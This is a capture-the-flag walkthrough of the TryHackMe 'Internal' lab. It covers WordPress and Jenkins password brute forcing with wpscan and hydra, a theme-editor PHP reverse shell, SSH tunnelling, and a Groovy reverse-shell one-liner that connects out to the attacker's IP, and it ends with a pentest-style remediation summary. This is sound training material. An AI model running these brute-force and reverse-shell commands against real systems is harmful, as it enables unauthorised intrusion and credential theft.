---
title: Internal (Windows)
description: Exploited Wordpress site with WPScan and brute force into web account. Then gain the initial foothold with common WordPress theme reverse shell. Discover Jenkins and pivot to the service to get the root credential.
author: Bsar
date: 2024-11-06 00:00:00 +06:00
categories: [TryHackMe]
tags: [Pivoting, Wordpress, wpscan, feroxbuster, wfuzz, Jenkin, pentestmonkeyshell.php, revshells.com, Plaintext, Enummeration]
image: /assets/img/posts/THM-Internal/Internal.webp
pin: true
math: true
mermaid: true
---

## Video

{% include embed/youtube.html id='at3Uhz5sMLU' %}

## Nmap

![image.png](/assets/img/posts/THM-Internal/image.png)

```bash
nmap -A -Pn -p- 10.10.74.197 -oN nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 07:33 EDT
Nmap scan report for 10.10.74.197
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1009.54 seconds
                                                                
```

# Port 80

![image1](/assets/img/posts/THM-Internal/image1.png)

# Feroxbuster

```bash
feroxbuster -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -r -C 400,401,402,403,404,500,501 -o ferox
200      GET       15l       74w     6147c http://internal.thm/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://internal.thm/
200      GET      328l     3640w    53892c http://internal.thm/blog/
200      GET        0l        0w        0c http://internal.thm/blog/wp-content/
200      GET        0l        0w        0c http://internal.thm/blog/wp-content/themes/
200      GET        0l        0w        0c http://internal.thm/blog/wp-content/plugins/
200      GET       83l      284w     4530c http://internal.thm/blog/wp-login.php?redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&reauth=1
200      GET      965l     2973w    34787c http://internal.thm/javascript/scriptaculous/controls
200      GET     7036l    18816w   180822c http://internal.thm/javascript/scriptaculous/prototype
200      GET      275l      856w    10162c http://internal.thm/javascript/scriptaculous/slider
```

![image2](/assets/img/posts/THM-Internal/image2.png)

**`wp-` stands for wordpress**

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

# `/etc/hosts`

![image3](/assets/img/posts/THM-Internal/image3.png)

# wpscan

```bash
wpscan --url http://internal.thm/blog/wp-login.php
```

![image4](/assets/img/posts/THM-Internal/image4.png)

![image5](/assets/img/posts/THM-Internal/image5.png)

```bash
[+] URL: http://internal.thm/blog/wp-login.php/ [10.10.213.152]
[+] Started: Thu Aug 29 20:25:20 2024
Interesting Finding(s):
[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
[+] WordPress readme found: http://internal.thm/blog/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite
[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299
[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/js/wp-util.min.js?ver=5.4.2
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/forms.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/l10n.min.css?ver=5.4.2
[i] The main theme could not be detected.
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:33 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:33
[i] No Config Backups Found.
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Thu Aug 29 20:26:08 2024
[+] Requests Done: 334
[+] Cached Requests: 4
[+] Data Sent: 92.668 KB
[+] Data Received: 22.31 MB
[+] Memory used: 261.414 MB
[+] Elapsed time: 00:00:48
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ 
```

# Wfuzz

```bash
wfuzz -c -f wfuzzing -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 375 -u "http://internal.thm" -H "HOST: FUZZ.internal.thm"
```

![image6](/assets/img/posts/THM-Internal/image6.png)

Scan for sub-domain, doesn’t work

# Wordpress

## `http://internal.thm/blog/wp-login.php/`

Log in with random username and password

![image7](/assets/img/posts/THM-Internal/image7.png)

Login with `admin`

![image8](/assets/img/posts/THM-Internal/image8.png)

Hydra? maybe?

# Actually we can brute force password with `WPScan`

```bash
wpscan -U "admin" -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog/wp-login.php/
```

![image9](/assets/img/posts/THM-Internal/image9.png)

![image10](/assets/img/posts/THM-Internal/image10.png)

```bash
admin:m[Redated]s
```

### It works

![image11](/assets/img/posts/THM-Internal/image11.png)

## `https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress`

![image12](/assets/img/posts/THM-Internal/image12.png)

# Pentest monkey `shell.php`

![image13](/assets/img/posts/THM-Internal/image13.png)

![image14](/assets/img/posts/THM-Internal/image14.png)

![image15](/assets/img/posts/THM-Internal/image15.png)

# Theme editor

```bash
http://internal.thm/blog/wp-admin/theme-editor.php
```

![image16](/assets/img/posts/THM-Internal/image16.png)

Update the theme

# RCE

```bash
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

![image17](/assets/img/posts/THM-Internal/image17.png)

![image18](/assets/img/posts/THM-Internal/image18.png)

![image19](/assets/img/posts/THM-Internal/image19.png)

![image20](/assets/img/posts/THM-Internal/image20.png)

![image21](/assets/img/posts/THM-Internal/image21.png)

```bash
/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );
```

Not useful

`https://api.wordpress.org/secret-key/1.1/salt/`

![image22](/assets/img/posts/THM-Internal/image22.png)

```bash
define('AUTH_KEY',         'jP?c; }x]=#3QF -]?n q$xa|WXUajc%zXfPHZAPGgeO(^1QA,gOLs}kMCb+oKZ:');
define('SECURE_AUTH_KEY',  '#*w?)9miW:R.3*0jXNo3 ^[6*_/+@eYjyFo.,Y-@}l=amIHTthtJ#43C*1{]#Pb(');
define('LOGGED_IN_KEY',    'j{m1WWx|G1FIDp>2,mfer+iPiF/;ru<%Tx%%j|R6i-~@I%GDJaum>i5DlZ+y|d++');
define('NONCE_KEY',        'IZaBM;scMR1qNY0_706:[6D_}nhj:nA0kl47| ;<K+Y--6`r[4uvN0tSZ#l)+Ft1');
define('AUTH_SALT',        '*KWq;K+m$}]II$QJI7w_R^K}fLt%R^SMfD6ln7qbeU5+k@Bx+2fmIPxI?+UM*+Pm');
define('SECURE_AUTH_SALT', '|V<nOy_B^76t<p^%ufbLXrBF3|Fuv`I<|[Z|^WUkzptS]P*,Gm1k;LdxJMtAlnB%');
define('LOGGED_IN_SALT',   'zY qVsUyx;]hP)7M3w2}w/|4.G5R-1b8$wXsdVm=DjH}>gZ@s(_%n7K=0E-%?]//');
define('NONCE_SALT',       'Tf{mwDO];PnGjGRc!&_I*h3e*8Vnu5EsIG/l2x/W(dSkI*DLedB+JVu~_HY.EZ?l');
```

# `linpeas.sh`

`chmod +x linpeas.sh`

![image23](/assets/img/posts/THM-Internal/image23.png)

![image24](/assets/img/posts/THM-Internal/image24.png)

![image25](/assets/img/posts/THM-Internal/image25.png)

```bash
aubreanna
```

![image26](/assets/img/posts/THM-Internal/image26.png)

```bash
cat /usr/share/openssh/sshd_config
```

![image27](/assets/img/posts/THM-Internal/image27.png)

```bash
B[Redated]q
wordpress123
```

```bash
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 68 Aug  3  2020 /var/lib/phpmyadmin/blowfish_secret.inc.php                                                 
-rw-r----- 1 root www-data 0 Aug  3  2020 /var/lib/phpmyadmin/config.inc.php
-rw-r----- 1 root www-data 527 Aug  3  2020 /etc/phpmyadmin/config-db.php
-rw-r----- 1 root www-data 8 Aug  3  2020 /etc/phpmyadmin/htpasswd.setup

```

# `/opt` useful

![image28](/assets/img/posts/THM-Internal/image28.png)

![image29](/assets/img/posts/THM-Internal/image29.png)

```bash
aubreanna:bu[Redacted]3
```

# SSH

```bash
ssh aubreanna@10.10.93.74
bu[Redacted]3
```

![image30](/assets/img/posts/THM-Internal/image30.png)

![image31](/assets/img/posts/THM-Internal/image31.png)

# Port forwarding?

## SSH Tunnel

![image32](/assets/img/posts/THM-Internal/image32.png)

```bash
aubreanna@internal:~$ ss -tulpn
Netid           State             Recv-Q            Send-Q                           Local Address:Port                         Peer Address:Port            
udp             UNCONN            0                 0                                127.0.0.53%lo:53                                0.0.0.0:*               
udp             UNCONN            0                 0                             10.10.93.74%eth0:68                                0.0.0.0:*               
tcp             LISTEN            0                 128                                  127.0.0.1:42721                             0.0.0.0:*               
tcp             LISTEN            0                 80                                   127.0.0.1:3306                              0.0.0.0:*               
tcp             LISTEN            0                 128                                  127.0.0.1:8080                              0.0.0.0:*               
tcp             LISTEN            0                 128                              127.0.0.53%lo:53                                0.0.0.0:*               
tcp             LISTEN            0                 128                                    0.0.0.0:22                                0.0.0.0:*               
tcp             LISTEN            0                 128                                          *:80                                      *:*               
tcp             LISTEN            0                 128                                       [::]:22                                   [::]:*               
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$
```

From our local machine, run **`ssh -L 10000:localhost:10000 <username>@<ip>`**

```bash
ssh -L 6868:172.17.0.2:8080 aubreanna@10.10.93.74
aubreanna:b[Redacted]3
```

#use different port than `8080` because we’ll need to use `Burpsuite`

![image33](/assets/img/posts/THM-Internal/image33.png)

# Now navigate to `localhost:6868` on web-browser


![image34](/assets/img/posts/THM-Internal/image34.png)

![image35](/assets/img/posts/THM-Internal/image35.png)

Nothing works

Tried default credential from Butler but still doesn’t work 

![image36](/assets/img/posts/THM-Internal/image36.png)

Gotta use burpsuite

# Burpsuite

Burpsuite uses port 8080 so we SSH tunnel to 6868

Also keep ssh port 22 connect too to enable SSH tunneling

![image37](/assets/img/posts/THM-Internal/image37.png)

# Hydra to Jenkins

TryHackMe Hackpack has bruteforce process with hydra.

```bash
hydra -l /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 6868 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -f
```

If it take too long just try to brute force with username: `Admin`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 6868 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -f
```

![image38](/assets/img/posts/THM-Internal/image38.png)

## SUCCESS!!!

## Jenkins credential

```bash
admin:s[Redacted]b
```

![image39](/assets/img/posts/THM-Internal/image39.png)

# Jenkins RCE

![image40](/assets/img/posts/THM-Internal/image40.png)

![image41](image41.png)

## Groovy syntax

```bash
String host="10.13.47.211";int port=6666;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![image42](/assets/img/posts/THM-Internal/image42.png)

`python -c 'import pty;pty.spawn("/bin/bash")';`

![image43](/assets/img/posts/THM-Internal/image43.png)

![image44](/assets/img/posts/THM-Internal/image44.png)

## Did we just pivot to another machine?

# `Linpeas.sh` again

![image45](/assets/img/posts/THM-Internal/image45.png)

![image46](/assets/img/posts/THM-Internal/image46.png)

![image47](/assets/img/posts/THM-Internal/image47.png)

```bash
root:t[Redacted]3
```

# SSH to root

![image48](/assets/img/posts/THM-Internal/image48.png)

![image49](/assets/img/posts/THM-Internal/image49.png)

```bash
root@internal:~# cd /home/aubreanna && cat user.txt && cd /root && cat root.txt && ifconfig && date
THM{Redacted}
THM{Redacted}
```

# Summary


A penetration test on INTERNAL corp on September 3th 2024 on an environment due to be released to production in three weeks. A security penetration test is a simulated cyber-attack on a computer system or network. The goal of this test is to identify and exploit vulnerabilities in the system in order to assess the system’s security posture. Penetration tests are an important part of a comprehensive security strategy and can help organizations identify and fix vulnerabilities before they are exploited by attackers.

Key Finding:

- Initially we gain access of Apache 2 Ubuntu default page, but after doing directory busting we can access to the login page for `Wordpress`.
- `Wordpress` is susceptible to information disclosure vulnerability by show a valid account of `admin`, when doing brute forcing attempt. The `admin` account has a weak credential.
- `Wordpress` is also susceptible to Remote Code Execution, that enable attacker to successfully launch a reverse shell and access the web account.
- After enumerating through the account, there is a valid user credential stored, and accessible to pivot to using secure shell (SSH). Which allow attacker to retrieve the first flag.
- A text document inform that a service (`Jenkins`) is running on another service called `Docker`.
- Attacker pivot to the service by using the user credential stored in the system.
- `Jenkins` account has a weak credential that allows attacker to brute force the password. The service allows attacker to run a arbitrary code to pivot and find another credential to escalate privilege to gain root access and retrieve the second flag.


Remediation Suggestion:

- Strong Password policy - Implementing minimum character to at least 16 character and a mix of letter, number and symbol which can discourage attacker from brute forcing the credential.
- Attempt Limit policy - time out multiple fail login attempt, keeping attacker from brute forcing attack.
- Multi Factor Authentication - an authentication process should be enable when account being access on services like WordPress and Jenkins.
- Stored Credential - sensitive credential should not be store in plaintext file. Should implement a password manager.
- Sensitive Information Disclosure - critical document such as service information, credentials should not be a store and accessible on the system.
